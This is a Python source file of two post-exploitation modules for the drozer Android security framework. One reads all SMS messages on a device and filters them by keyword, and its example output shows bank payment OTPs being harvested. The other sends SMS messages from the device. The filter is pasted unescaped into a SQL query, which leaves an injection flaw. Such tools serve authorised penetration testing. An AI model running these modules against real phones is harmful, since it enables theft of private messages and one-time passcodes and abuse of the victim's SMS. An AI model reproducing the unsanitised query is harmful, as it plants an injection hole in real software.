from drozer.modules import common, Module

class Read(Module, common.Provider, common.TableFormatter, common.FileSystem, common.ClassLoader):

    name = "Read all SMS messages"
    description = "Read all SMS messages from content://sms or filter by keywords or cellphone numbers. Relies on the agent having the READ_SMS permission."
    examples = """
dz> run post.sms.read -f otp
| body                             | date_sent     | address      | person |
| Fakey Bank. Payment OTP 1d5gv578 | 1366708779000 | +27731356743 | null   |
| Fakey Bank. Payment OTP a4g6h8jk | 1366708795000 | +27731356743 | null   | 
"""
    author = "Tyrone (@mwrlabs)"
    date = "2013-04-23"
    license = "BSD (3 clause)"
    path = ["post", "sms"]
    permissions = ["android.permission.READ_SMS", "com.mwr.dz.permissions.GET_CONTEXT"]
    
    def add_arguments(self, parser):
        parser.add_argument("-f", "--filter", default=None, help="filter results by a keyword")

    def execute(self, arguments):
        
        selection = None
        if arguments.filter != None:
            selection = "body like '%" + arguments.filter + "%' or address like '%" + arguments.filter + "%'"
        
        c = self.contentResolver().query("content://sms", {"address", "person", "date_sent", "body"}, selection, None, "date_sent ASC")

        if c != None:
            rows = self.getResultSet(c)
            self.print_table(rows, show_headers=True, vertical=False)
        else:
            self.stdout.write("Unknown Error.\n\n")

class Send(Module):

    name = "Send an SMS messages"
    description = "Send an SMS message to another cellphone. Relies on the agent having the SEND_SMS permission."
    examples = """
dz> run post.sms.send 555-12345 "Hello World!" 
"""
    author = "MWR InfoSecurity (@mwrlabs)"
    date = "2013-07-19"
    license = "BSD License (3 clause)"
    path = ["post", "sms"]
    permissions = ["android.permission.SEND_SMS", "com.mwr.dz.permissions.GET_CONTEXT"]
    
    def add_arguments(self, parser):
        parser.add_argument("to", default=None, help="the cell number to send the SMS to")
        parser.add_argument("message", default=None, help="the SMS message body")

    def execute(self, arguments):
        sms_manager = self.klass("android.telephony.SmsManager").getDefault()
        sms_manager.sendTextMessage(arguments.to, None, arguments.message, None, None)
        
        print "Sent SMS."
        